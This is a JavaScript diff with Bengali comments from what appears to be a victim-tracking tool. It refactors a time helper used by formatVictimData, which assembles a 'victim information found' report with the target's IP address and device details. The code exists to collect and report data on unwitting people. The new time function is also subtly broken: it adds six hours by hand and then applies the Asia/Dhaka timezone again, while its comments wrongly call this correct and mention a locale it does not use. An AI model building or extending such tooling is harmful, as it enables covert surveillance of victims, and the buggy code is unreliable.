@@ -201,22 +201,33 @@ function getDeviceModel(device) {
 }
 
 // ================================================================
-// 🔥 ভিক্টিম ডেটা ফরম্যাট (বাংলাদেশ সময় সহ)
+// 🔥 বাংলাদেশ সময় তৈরি করার ফাংশন (সরাসরি UTC+6 অফসেট)
 // ================================================================
-function formatVictimData(victim) {
-    const d = victim.device || {};
-    
-    // 🔥 বাংলাদেশ সময় (GMT+6)
-    const deviceTime = new Date().toLocaleString('bn-BD', { 
-        timeZone: 'Asia/Dhaka',
-        hour12: true,
+function getBangladeshTime() {
+    const now = new Date();
+    // UTC থেকে +6 ঘন্টা যোগ করুন
+    const bangladeshTime = new Date(now.getTime() + (6 * 60 * 60 * 1000));
+    // ফরম্যাট করুন (বাংলা মাস ও দিনের জন্য আমরা English locale ব্যবহার করছি)
+    return bangladeshTime.toLocaleString('bn-BD', {
+        timeZone: 'Asia/Dhaka', // এটাই সঠিক
         year: 'numeric',
         month: '2-digit',
         day: '2-digit',
         hour: '2-digit',
         minute: '2-digit',
-        second: '2-digit'
+        second: '2-digit',
+        hour12: true
     });
+}
+
+// ================================================================
+// 🔥 ভিক্টিম ডেটা ফরম্যাট (বাংলাদেশ সময় সহ)
+// ================================================================
+function formatVictimData(victim) {
+    const d = victim.device || {};
+    
+    // 🔥 বাংলাদেশ সময়
+    const deviceTime = getBangladeshTime(); // ব্যবহার করুন
     
     let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
     msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
